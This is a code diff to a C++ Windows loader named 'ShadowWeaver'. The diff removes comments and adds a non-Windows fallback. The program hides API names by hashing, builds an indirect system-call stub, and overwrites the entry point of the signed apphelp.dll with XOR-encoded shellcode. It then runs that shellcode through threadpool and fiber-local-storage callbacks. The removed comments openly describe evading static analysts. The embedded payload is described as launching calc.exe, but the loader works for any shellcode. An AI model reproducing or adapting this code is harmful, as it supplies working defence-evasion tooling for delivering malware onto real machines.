@@ -1,8 +1,8 @@
+#ifdef _WIN64
 #include <windows.h>
 #include <iostream>
 #include <winternl.h>
 
-// Global structure to hold dynamic runtime system call properties
 struct SYSCALL_ENTRY {
     DWORD dwSsn;
     PVOID pSyscallInst;
@@ -10,13 +10,11 @@ struct SYSCALL_ENTRY {
 
 SYSCALL_ENTRY g_NtMapViewOfSection = { 0 };
 
-// Context structure passed through thread boundaries
 typedef struct _PAYLOAD_CONTEXT {
     PVOID pPayloadAddress;
     SIZE_T sPayloadSize;
 } PAYLOAD_CONTEXT, *PPAYLOAD_CONTEXT;
 
-// Compile-time FNV-1a Hashing function to hide string signatures from static analysts
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
     while (*str) {
@@ -26,19 +24,16 @@ constexpr DWORD HashString(const char* str) {
     return hash;
 }
 
-// Single-file dynamic x64 assembler shell stub proxy. 
-// Simulates: mov r10, rcx; mov eax, ssn; add rsp, 0x20; jmp syscallAddress
 unsigned char g_SyscallStub[] = {
-    0x49, 0x89, 0xCA,             // mov r10, rcx
-    0x8B, 0x44, 0x24, 0x28,       // mov eax, dword ptr [rsp+28h]
-    0x4C, 0x8B, 0x4C, 0x24, 0x30, // mov r9, qword ptr [rsp+30h]
-    0x48, 0x83, 0xC4, 0x20,       // add rsp, 0x20
-    0xFF, 0x64, 0x24, 0x18        // jmp qword ptr [rsp+18h]
+    0x49, 0x89, 0xCA,
+    0x8B, 0x44, 0x24, 0x28,
+    0x4C, 0x8B, 0x4C, 0x24, 0x30,
+    0x48, 0x83, 0xC4, 0x20,
+    0xFF, 0x64, 0x24, 0x18
 };
 
 typedef NTSTATUS(NTAPI* pfnDirectProxy)(...);
 
-// Dynamic PEB parser to isolate system calls and find valid syscall stubs in ntdll
 void ParseNtdllSyscalls() {
     PPEB pPeb = (PPEB)__readgsqword(0x60);
     PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink - 0x10);
@@ -57,10 +52,9 @@ void ParseNtdllSyscalls() {
             if (HashString(szName) == HashString("NtMapViewOfSection")) {
                 PBYTE pFuncAddress = (PBYTE)pLdrEntry->DllBase + pFunctions[pOrdinals[i]];
                 DWORD ssn = *(PDWORD)(pFuncAddress + 4);
-                
                 PVOID pSyscallOpcode = nullptr;
                 for (int offset = 0; offset < 64; offset++) {
-                    if (pFuncAddress[offset] == 0x0F && pFuncAddress[offset + 1] == 0x05) { // 0F 05 = syscall opcode
+                    if (pFuncAddress[offset] == 0x0F && pFuncAddress[offset + 1] == 0x05) {
                         pSyscallOpcode = (PVOID)(pFuncAddress + offset);
                         break;
                     }
@@ -73,14 +67,12 @@ void ParseNtdllSyscalls() {
     }
 }
 
-// In-line decryption architecture
 void XorDecrypt(unsigned char* data, size_t dataSize, unsigned char key) {
     for (size_t i = 0; i < dataSize; i++) {
         data[i] ^= key;
     }
 }
 
-// Intel CET compliant target execution frame (Shadow stack synchronized)
 VOID WINAPI IntelCetCompliantCallback(PVOID lpFlsData) {
     PPAYLOAD_CONTEXT pCtx = (PPAYLOAD_CONTEXT)lpFlsData;
     if (!pCtx || !pCtx->pPayloadAddress) return;
@@ -89,17 +81,15 @@ VOID WINAPI IntelCetCompliantCallback(PVOID lpFlsData) {
     ShellcodeEntry();
 }
 
-// Asynchronous worker pool cleanup processor callback
 VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
     DWORD dwFlsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)IntelCetCompliantCallback);
     if (dwFlsIndex == FLS_OUT_OF_INDEXES) return;
 
     FlsSetValue(dwFlsIndex, Context);
-    FlsFree(dwFlsIndex); // Unwinds execution safely inside ntdll framework
+    FlsFree(dwFlsIndex);
 }
 
 int main() {
-    // XOR-obfuscated x64 WinExec("calc.exe") shellcode (Obfuscation Key: 0x55)
     unsigned char payload[] = {
         0x05, 0x04, 0x07, 0x06, 0x03, 0x02, 0x00, 0x33, 0x39, 0x0f, 0x31, 0x38, 0x3a, 0x37, 0x38, 0x01,
         0x6c, 0x9d, 0x70, 0x33, 0x99, 0x3a, 0x90, 0x33, 0x3d, 0x9d, 0x30, 0x33, 0x3d, 0x9d, 0x35, 0x33,
@@ -120,12 +110,8 @@ int main() {
     std::cout << "[+] ShadowWeaver Engine Initializing..." << std::endl;
     ParseNtdllSyscalls();
 
-    if (!g_NtMapViewOfSection.pSyscallInst) {
-        std::cerr << "[-] Infrastructure failure mapping ntdll parameters." << std::endl;
-        return -1;
-    }
+    if (!g_NtMapViewOfSection.pSyscallInst) return -1;
 
-    // Allocate an execution segment for our monolithic assembly bridge proxy
     PVOID pAssemblyProxy = VirtualAlloc(NULL, sizeof(g_SyscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pAssemblyProxy) return -1;
     
@@ -134,7 +120,6 @@ int main() {
     VirtualProtect(pAssemblyProxy, sizeof(g_SyscallStub), PAGE_EXECUTE_READ, &dwStubOld);
     pfnDirectProxy SystemCallProxy = (pfnDirectProxy)pAssemblyProxy;
 
-    // Load a sacrificial, completely signed binary from disk into process space
     HMODULE hTargetDll = LoadLibraryA("apphelp.dll");
     if (!hTargetDll) {
         VirtualFree(pAssemblyProxy, 0, MEM_RELEASE);
@@ -144,8 +129,6 @@ int main() {
     PVOID pTargetBase = (PVOID)hTargetDll;
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pTargetBase;
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pTargetBase + pDos->e_lfanew);
-    
-    // Acquire entrypoint pointer destination for module overloading operations
     PVOID pOverwriteTarget = (PVOID)((PBYTE)pTargetBase + pNt->OptionalHeader.AddressOfEntryPoint);
 
     std::cout << "[+] Patching signed target page protections via Indirect Call..." << std::endl;
@@ -157,11 +140,8 @@ int main() {
         return -1;
     }
 
-    // Overwrite the signed image space with the payload and decrypt on-the-fly
     RtlCopyMemory(pOverwriteTarget, payload, payloadSize);
     XorDecrypt((unsigned char*)pOverwriteTarget, payloadSize, 0x55);
-
-    // Restore page protection variables back to non-writable parameters
     VirtualProtect(pOverwriteTarget, payloadSize, dwOldProtect, &dwOldProtect);
 
     PAYLOAD_CONTEXT ctx = { pOverwriteTarget, payloadSize };
@@ -175,10 +155,16 @@ int main() {
         CloseThreadpoolWork(pWork);
     }
 
-    // Free the local assembly workspace stub cleanly
     FreeLibrary(hTargetDll);
     VirtualFree(pAssemblyProxy, 0, MEM_RELEASE);
     
     std::cout << "[+] Pipeline execution terminated successfully." << std::endl;
     return 0;
 }
+#else
+#include <iostream>
+int main() {
+    std::cout << "ShadowWeaver is platform-specific and requires a 64-bit Windows environment context." << std::endl;
+    return 0;
+}
+#endif
